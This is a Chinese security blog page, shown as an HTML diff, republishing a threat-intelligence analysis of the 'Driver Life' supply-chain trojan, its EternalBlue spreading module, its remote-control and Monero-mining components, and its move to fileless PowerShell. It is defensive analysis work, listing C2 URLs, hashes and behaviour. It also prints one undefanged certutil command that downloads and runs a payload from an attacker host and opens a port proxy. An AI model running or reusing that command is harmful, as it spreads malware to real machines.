@@ -1,0 +1,686 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>谈一谈驱动人生木马 | hskull</title><meta name="keywords" content="‘驱动人生,永恒之蓝,样本,分析'"><meta name="author" content="hskull,hskull00@outlook.com"><meta name="copyright" content="hskull"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="​    本文是作者在奇安信威胁情报中心公众号发布的文章永恒的对手：永恒之蓝挖矿木马的前世今生，这里在个人博客做个记录。 1. 概述​    “驱动人生”劫持木马是在18年12月份爆发的一次攻击，木马团伙通过劫持驱动人生升级服务器下发该木马致使大量客户中招。此木马近年来一直处于活跃状态，攻击、传播手法持续更新。在进行客户侧应急时，我们经常会遇到该系列木马，由于该木马使用的攻击与传播手段基本覆盖了常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="谈一谈驱动人生木马">
+<meta property="og:url" content="http://example.com/2021/03/06/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E8%B0%88%E4%B8%80%E8%B0%88%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:site_name" content="hskull">
+<meta property="og:description" content="​    本文是作者在奇安信威胁情报中心公众号发布的文章永恒的对手：永恒之蓝挖矿木马的前世今生，这里在个人博客做个记录。 1. 概述​    “驱动人生”劫持木马是在18年12月份爆发的一次攻击，木马团伙通过劫持驱动人生升级服务器下发该木马致使大量客户中招。此木马近年来一直处于活跃状态，攻击、传播手法持续更新。在进行客户侧应急时，我们经常会遇到该系列木马，由于该木马使用的攻击与传播手段基本覆盖了常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hskull00/Images/样本分析/驱动人生v2-655f91de80d1ad2249fcd7579f573c21_ipico.jpg">
+<meta property="article:published_time" content="2021-03-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-29T08:49:57.333Z">
+<meta property="article:author" content="hskull">
+<meta property="article:tag" content="样本分析">
+<meta property="article:tag" content="永恒之蓝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hskull00/Images/样本分析/驱动人生v2-655f91de80d1ad2249fcd7579f573c21_ipico.jpg"><link rel="shortcut icon" href="/img/hacker2.png"><link rel="canonical" href="http://example.com/2021/03/06/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E8%B0%88%E4%B8%80%E8%B0%88%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: hskull","link":"链接: ","source":"来源: hskull","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-29 16:49:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="hskull" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/20201231224217.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资料</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 图库</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 技术博客</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/hskull00/Images/样本分析/驱动人生v2-655f91de80d1ad2249fcd7579f573c21_ipico.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">hskull</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资料</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 图库</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 技术博客</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">谈一谈驱动人生木马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-05T16:00:00.000Z" title="发表于 2021-03-06 00:00:00">2021-03-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-10-29T08:49:57.333Z" title="更新于 2021-10-29 16:49:57">2021-10-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>​    本文是作者在奇安信威胁情报中心公众号发布的文章<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mMi5fHtBPuN09uH6FKm0_g">永恒的对手：永恒之蓝挖矿木马的前世今生</a>，这里在个人博客做个记录。</p>
+<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>​    “驱动人生”劫持木马是在18年12月份爆发的一次攻击，木马团伙通过劫持驱动人生升级服务器下发该木马致使大量客户中招。此木马近年来一直处于活跃状态，攻击、传播手法持续更新。在进行客户侧应急时，我们经常会遇到该系列木马，由于该木马使用的攻击与传播手段基本覆盖了常见的各种方法，此木马在内网的流行程度反而在一定程度上反映了一个网络的安全性，甚至可以用来作为指标来评估内网的安全程度。</p>
+<p>​    鉴于此种情况，我们认为有必要对“永恒之蓝木马下载器”(由于病毒发展，逐步脱离了最初得驱动人生模块，后文都用此称呼来描述)进行一个总结性的整理，本文从该木马功能演进角度出发，说明了各个时间点木马的特性并对木马中的各个模块进行了一个简单的分析。</p>
+<h2 id="00-时间线梳理"><a href="#00-时间线梳理" class="headerlink" title="00 时间线梳理"></a>00 时间线梳理</h2><p>​    对“永恒之蓝木马下载器”系列木马更新时间线进行整理如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153054.png"></p>
+<h1 id="2-最初的攻击方式"><a href="#2-最初的攻击方式" class="headerlink" title="2. 最初的攻击方式"></a>2. 最初的攻击方式</h1><p>​    2018年12月14日，“永恒之蓝木马下载器”攻击爆发，攻击者利用驱动人生团队外出团建的时机，开始了一次蓄谋已久的恶意活动。其利用前期已掌握到的信息，在14日下午劫持了驱动人生公司的升级服务器，修改了服务器中负责升级的配置文件ServiceConfig.xml，利用该配置文件中的存储的SQL数据库IP和密码登陆到SQL数据库并向其中插入了恶意下载链接：</p>
+<p><code>hxxp://pull[.]update[.]ackng[.]com/ </code></p>
+<p>​    从而实现劫持人生日历、USB宝盒、160压缩、160Wifi等软件的升级通道，进而可以进行恶意程序分发。</p>
+<p>​    此次攻击是一次典型的供应链攻击事件，据监测从攻击爆发开始，仅仅两个小时中招用户就达到了10万的高峰，其恶意代码具体的分发流程如图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153454.png"></p>
+<p>​    此时下载到的恶意木马主要被用于释放挖矿与远控的加载器、下载内网横向传播模块等，横向传播使用了经典的“永恒之蓝”漏洞。最初Payload的下载地址为：</p>
+<p><code>hxxp://dl[.]haqo[.]net/</code></p>
+<p>​    目前已知从该地址下载到的文件名为：dl.exe、dll.exe、eb.exez、updater等。</p>
+<p>​    对于中招的机器，则会执行bat命令尝试进行横向移动 。</p>
+<p>​    最初的攻击链中，更新程序DTLUpg.exe从如下形式的C2下载第一阶段Payload：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hxxp://pull[.]update[.]ackng[.]com/ziptool/PullExecute/F79CB9D2893B254CC75DFB7F3E454A69.exe    hxxp://pull[.]update[.]ackng[.]com/160wifibroad/pullexecute/f79cb9d2893b254cc75dfb7f3e454a69.exe</span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+
+<p>​    劫持后不同URL仅仅对应驱动人生系列的不同产品，最终均为同一个恶意程序。该阶段恶意程序执行流程如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153629.png"></p>
+<h2 id="00-木马主体分析"><a href="#00-木马主体分析" class="headerlink" title="00 木马主体分析"></a>00 木马主体分析</h2><p>​    病毒文件f79cb9d2893b254cc75dfb7f3e454a69.exe一般被下载释放在C:\Program File\DTLSoft\Updater\ctrlf路径下，主要行为如下：</p>
+<ol>
+<li>将自身拷贝到System32(SysWOW64)下，命名为svhost.exe(即C:\Windows\System32\svhost.exe)，并安装为服务，服务名为”Ddriver”：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153750.png"></p>
+<p>​    启动服务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153805.png"></p>
+<ol start="2">
+<li><p>作为服务运行后，进入注册函数执行，主要完成了对于远控模块svhhost.exe的释放和拉取，以及对于攻击模块svvhost.exe的下载和执行，具体细节如下：</p>
+<ul>
+<li>创建互斥体”it is holy shit”，检测是否重复启动服务进行感染：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153915.png"></p>
+<ul>
+<li>将资源中的”zip”下的PE文件释放为System32(SysWOW64)下的svhhost.exe，即远控模块：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153944.png"></p>
+<p>​    svhost.exe的资源如下所示,PE信息被明文存储：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154008.png"></p>
+<ul>
+<li>在svhhost.exe中创建互斥体防止多开：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154109.png"></p>
+<p>​    同时会循环检测任务管理器以及一系列游戏进程，若有在执行的，则将svhhost.exe退出，以更好的隐藏自身：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154120.png"></p>
+<ul>
+<li><p>获取当前计算机信息，包括计算机名称、GUID、用户名、系统产品号、系统版本、系统平台、显卡信息、杀软信息等。将上述所有信息上传到</p>
+<p><code>hxxp://i[.]haqo.net/i.png</code></p>
+<p>或</p>
+<p><code>hxxp://p[.]abbny.com/im.png</code></p>
+<p>等待C2返回控制信息并执行：</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154212.png"></p>
+<ul>
+<li>通过共享内存和远控模块svhhost.exe交互，将下载到的ShellCode通过该共享内存传递给svhhost.exe执行，一般用来执行挖矿代码：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154234.png"></p>
+<ul>
+<li><p>下载svvhost.exe永恒之蓝攻击模块到本地并执行，下载URL为 ：</p>
+<p><code>hxxp://dl[.]haqo[.]net/eb.exez</code></p>
+<p>若返回的数据有“.exez”后缀信息则下载文件：</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154515.png"></p>
+<p>​    其保存位置为C:\Windows\temp\svvhost.exe：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154857.png"></p>
+</li>
+</ol>
+<h2 id="01-远控模块分析"><a href="#01-远控模块分析" class="headerlink" title="01 远控模块分析"></a>01 远控模块分析</h2><p>​    样本信息如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">svhhost.exe</td>
+<td align="center">74e2a43b2b7c6e258b3a3fc2516c1235</td>
+</tr>
+</tbody></table>
+<p>​    远控模块木马svhhost.exe主要作用是：每隔2秒从主体样本svhost.exe共享的内存 “HSKALWOEDJSLALQEOD”中读取shellcode，然后进行解压(解密)并执行。整体流程主要包括了持久化操作、获取共享内存执行shellcode:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029164704.png"></p>
+<p>​    遗憾的是由于时间太久，分析时不能获取到通过内存加载执行shellcode的功能链接，通过对我们在2019年1月9号检测到的名为xmrig-64_1.mlz的文件，也就是上文中提到的通过共享内存传递的Shellcode进行分析，可以确认该文件为门罗币的矿机，文件下载地址为：</p>
+<p><code>hxxp://dl[.]haqo.net/xmrig-64_1.mlz</code>，链接矿池172.105.204.237 进行挖矿。</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xmrig-64_1.mlz</td>
+<td>24c4149468926bedcb41f50ac88b40f3</td>
+</tr>
+</tbody></table>
+<h2 id="02-永恒之蓝传播模块分析"><a href="#02-永恒之蓝传播模块分析" class="headerlink" title="02 永恒之蓝传播模块分析"></a>02 永恒之蓝传播模块分析</h2><p>​    样本信息如下：</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">svvhost.exe</td>
+<td align="center">2e9710a4b9cba3cd11e977af87570e3b</td>
+</tr>
+</tbody></table>
+<p>​    svvhost.exe是利用py2exe对python代码进行打包实现的“永恒之蓝”传播模块，将其解压后可以看到如下一系列pyo文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155247.png"></p>
+<p>​    传播模块每隔20min进行一次攻击，包括内网漏洞机器及部分外网IP，对于中招的机器，会运行bat命令进行扩散：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c certutil -urlcache -split -fhttp://dl.haqo.<span class="built_in">net</span>/ dl.exe c:/install.exe&amp;c:/install.exe&amp;netshfirewall add portopening tcp <span class="number">65531</span> DNS&amp;netsh interface portproxy    add v4tov4listenport=<span class="number">65531</span> connectaddress=<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> connectport=<span class="number">53</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155312.png"></p>
+<h1 id="3-向无文件攻击方式转变"><a href="#3-向无文件攻击方式转变" class="headerlink" title="3. 向无文件攻击方式转变"></a>3. 向无文件攻击方式转变</h1><p>​    通过上文的分析得知，最初“永恒之蓝木马下载器”系列木马的远控模块和传播模块文件需要落地，较为容易查杀，随着时间的推进，攻击者对木马进行了改进，最终完全脱离了原有流程，做到了无文件落地的”计划任务+PowerShell”的攻击模式，这使得攻击更加隐蔽，查杀难度增大。</p>
+<p>​    从2018年12月19号开始，攻击者开始逐步进行更新，首先更新的是传播模块。</p>
+<p>​    木马攻击成功后会在失陷主机上创建一个名为Bluetooths的计划任务，该计划任务会利用PowerShell从v.beahh.com处获取新的payload进行执行，该系列payload会为下载模块功能做前期准备，准备完成后下载攻击传播模块及挖矿模块到内存，然后直接利用IEX命令进行执行。 </p>
+<p>​    由此开始，“永恒之蓝木马下载器”系列木马实现了新的攻击方式，脱离了最初版本需要文件落地的攻击模式，做到了无文件落地攻击。</p>
+<p>​    整个攻击流程的变迁效果如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155422.png"></p>
+<h2 id="00-新传播模块分析"><a href="#00-新传播模块分析" class="headerlink" title="00 新传播模块分析"></a>00 新传播模块分析</h2><p>​    与上述最初的传播模块还只是利用单一的永恒之蓝漏洞攻击不同，新的攻击组件集成了永恒之蓝漏洞、SMB爆破、MsSQL爆破等攻击方式，同时利用到了黑客工具mimiktaz、psexec等进行辅助破解攻击，在攻击成功后也采用添加用户、创建服务、创建计划任务的方式对被攻破的机器进行感染和控制。</p>
+<p>​    这里我们从最新的传播模块进行整体手法的剖析，其中捕获到的一份利用url：</p>
+<p><code>hxxp://27.102.107[.]137/ii.exe</code></p>
+<p>​    下载的传播模块文件ii.exe(md5:def0e980d7c2a59b52d0c644a6e40763 )，该文件由pyinstaller打包而来，其和最初传播模块具体不同如下：</p>
+<ol>
+<li>使用窃取的数字签名（当前已过期），并将py模块编译为库（pyd）从而达到隐藏自己与增加分析难度的目的：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155536.png"></p>
+<p>​    去除签名，然后反编译，解包后的内容如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155600.png"></p>
+<p>​    继续反编译ii.pyc，得到脚本，脚本使用了base64和bz2加密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155819.png"></p>
+<p>​    对加密脚本进行解密，其中依旧使用名称替换的方式进行了混淆，结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155842.png"></p>
+<ol start="2">
+<li>首先会检测更新当前机器传播模块的版本是否为最新版。具体是通过内存映射检测当前版本，版本存储于内存映射中的格式为“自身路径+’**’+当前版本号+’$$’”，判断版本号是否相同，如果当前版本大于内存映射中的版本，则将程序复制过去：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155918.png"></p>
+<ol start="3">
+<li> 加入了SMB、MSSQL弱口令爆破攻击，用于SMB、MsSql爆破的弱口令如下图所示。</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155946.png"></p>
+<p>​    其中，部分SMB弱口令攻击代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160019.png"></p>
+<p>​    部分MsSQL数据库弱口令攻击代码如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160151.png"></p>
+<ol start="4">
+<li>之后会将多层混淆的mimikatz工具的powershell代码写入当前目录下的m2.ps1文件中，并将其在内存中直接执行：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160212.png"></p>
+<p>​    部分m2.ps1内代码如下图所示:</p>
